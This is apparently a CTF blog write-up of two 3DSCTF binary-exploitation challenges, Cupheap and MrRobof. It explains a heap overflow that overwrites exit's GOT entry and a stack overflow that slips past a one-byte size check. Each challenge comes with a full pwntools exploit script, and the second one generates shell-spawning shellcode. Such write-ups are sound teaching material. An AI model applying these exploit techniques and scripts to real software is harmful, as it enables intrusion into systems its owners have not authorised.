---
layout: default
title:  "3DSCTF - Cupheap, MrRobof" 
date:   2018-01-14
author: dreamist
categories: update post 3dsctf writeup pwn python
---

In between flights I had gotten to doing two of the PWN challenges in 3DSCTF.
Here I shall explain as best I can the notes I took during the event.

## Cupheap

First things first, we're exploiting a 64-bit x86 binary with NX enabled, partial RELRO,
and neither PIC nor stack canaries.

When you run the binary, you get the following opening prompt.

```
       Well Cuphead and his pal Mugman
            They like to roll the dice
                   By chance they came
                        On Heap's game
          And gosh they paid the price
                      (Paid the price)

              And now they're fighting
                       For their lives
       On a mission fraught with dread
                   And if they proceed
                     But don't succeed
Well, the Devil will take their faults

After loose a bet against The Devil, now they need to collect 
 memory contracts to bargain for their souls.

Choose one option:

1 - Collect memory
2 - Defeat Dice right-hand of The Devil
3 - Give up
```

Cool stuff.

Each time you collect memory, you're randomly incrementing a global variable `contracts`
in amounts of 0, 0x400, or 0x800 in rounds of five. You start with 0x100. 
On a few different specific amounts,
new options open up. Randomization seeded with `srand(time())`.

Also, when the main function first runs, there's four calls to malloc, moving the heap
into something like this, where each cell is 8 bytes in length.

```
Malloc 1 (0x10)
.--------------------------.
|___0x1_____|___malloc2_ptr|
                   |          
Malloc 2 (0x8)     |
-------------      |
|__empty____|<-----*

Malloc 3 (0x10)
.--------------------------.
|___0x1_____|___malloc4_ptr|
                   |          
Malloc 4 (0x8)     |
-------------      |
|__empty____|<-----*

```

The pointers to the Malloc 1 and Malloc 3 region (both containing pointers to the
2nd and 4th) are stored on the stack. Under glibc's malloc implementation, these
allocations are contiguous, one coming right after the other, which opens up the 
door for us when we can hit the `mausoleum` function. This function can only
be reached after reaching 0x1100 souls, achievable with checks in a loop.
I mentally decompiled this function from the disassembly into the following C-psuedocode.

```
void mausoleum(){
	extern (void*) malloc1[2];
        extern (void*) malloc3[2];
        char buffer[0x1000];
        printf("You are in the Mausoleum...\n");
        fgets(buffer, 0x1000, stdin);
        strcpy(malloc1[1], buffer);
        fgets(buffer, 0x1000, stdin);
        strcpy(malloc3[1], buffer);
}
```
 
The neat ordering of the allocations allow us to use strcpy to overflow through Malloc 2,
and into Malloc 3 such that we can overwrite the pointer to Malloc 4. Then
when strcpy gets called again, we can essentially get an arbitrary write into anywhere in the
process space.

The arbitrary write might have a number of good targets, but the most convenient is the
[Global Offset Table](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) entry for `exit`, since it's called very soon after. After doing some
additional enumeration of abusable functions within the binary, I notice one that was
compiled in, but never called. `visitHell` turned out to read the flag from a file on the local
file system, removing the need for me to get a shell. 

Here's the essential exploit.

```
#!/usr/bin/python

from pwn import *

binary = "cupheap"
elf = ELF(binary)
chall, port = "cupheap01.3dsctf.org", 8007

context.log_level = "DEBUG"
DEBUG = False


def getpipe():
    if DEBUG:
        return process(binary)
    else:
        return remote(chall, port)

"""
In order to reach the vulnerable code in mauosoleum,
we have to get exactly 0x1100 in the variable contracts.
This variable is printed out in hex after every use of the
first menu option "Collect memory."

This has to be tried repeatedly until we get exactly 0x1100.
"""
p = None

def getContracts(proc):
    while True:
        proc.recvuntil("Give up\n")
        proc.send("1\n")
        proc.recvuntil("You have ")
        contracts = int(proc.recv(6), 16)
        if contracts == 0x1100:
            return True
        elif contracts > 0x1100:
            return False

p = getpipe()

while getContracts(p) != True:
    p.close()
    p = getpipe()

"Drop into the second menu form immediately by giving some char not 1-3"
if "What's next?" not in p.recv():
    p.send("\n\n")

p.recv()

"""
At this point, we should be granted access to the Mausoleum.

Now we take advantage of adjacent heap allocations.
"""

p.send("4\n") #Enter the Mausoleum

""" Overwrite pointer to malloc4 with exit()'s GOT entry."""
payload1 = flat([0xAAAAAAAAAAAAAAAA]*5, elf.got['exit'], word_size=64)

p.sendline(payload1)
#What's visitHell()?
visitHell = elf.symbols[u'_Z9visitHellv']
payload2 = flat(visitHell, word_size=64)
p.sendline(payload2)

print p.recv()

#3DS{y0u_ALL_fr33_0F_th3_H34Ps_d3BT}
```

# MrRobof

> Sometimes, Elliot needs to do boring work.

No NX, no stack canary, and no PIC despite using code that loads data position-independent.

The binary reads in arbitrarily-sized data into a size-0x28 (40 bytes) buffer on the stack.
The trick is that the input is put through two sets of input validation, 
in `validateSize` and `validateIP`.

`validateIP` simply loops through the first 40 characters to only allow an ipv6 address.
`validateSize` takes the size of the input into a single byte, and compares that single BYTE
against 40. 

In order to bypass, the first 40 characters need to be a valid ipv6 address, and
the recorded size count must be between 0 and 0x28 when stuck in a single byte.

So, without NX I first set out to get a shell by getting our EIP to point to the stack, but
after doing some enumeration, a compiled-yet-unused function was again the easiest way to get
the flag. Some of the code in the following exploit is then probably unnecessary,
since I didn't need my own shellcode.

```
from pwn import *

binary = "mrrobof" #Renamed just because
chall, port = "mrrobof01.3dsctf.org", 8006
e = ELF(binary)

context.log_level = "DEBUG"
DEBUG = False

def getpipe():
    if DEBUG:
        return process(binary)
    else:
        return remote(chall, port)

input_len = 0x1ff00

"""Send an example ip str + someint*0x100 + randrange(0x2,0x28)"""
ip_ex = "2001:0db8:85a3:0000:0000:8a2e:0370:7334."

shellcode = asm(shellcraft.linux.sh())

"""Heh, might not be PIE after all. But there's something I missed again."""
readIPs = e.symbols['readIPs'] #Again?
control_eip = flat("A"*12, readIPs)

padding = "\x90"*(input_len - len(shellcode) - len(ip_ex) - len(control_eip))
code = padding + shellcode

payload = ip_ex
payload += control_eip
payload += code
payload += '\x90'*3 #Need counting byte of 0x2-0x28 to pass, last gets chopped

print "Length:", hex(len(payload))

open("payload","w").write(payload)

p = getpipe()
p.sendline(payload)
print p.recv()
time.sleep(0.3)

if DEBUG and p.poll() == None:
    print p.recv()
if not DEBUG:
    print p.recv()

```

Didn't write down the flag to this one.
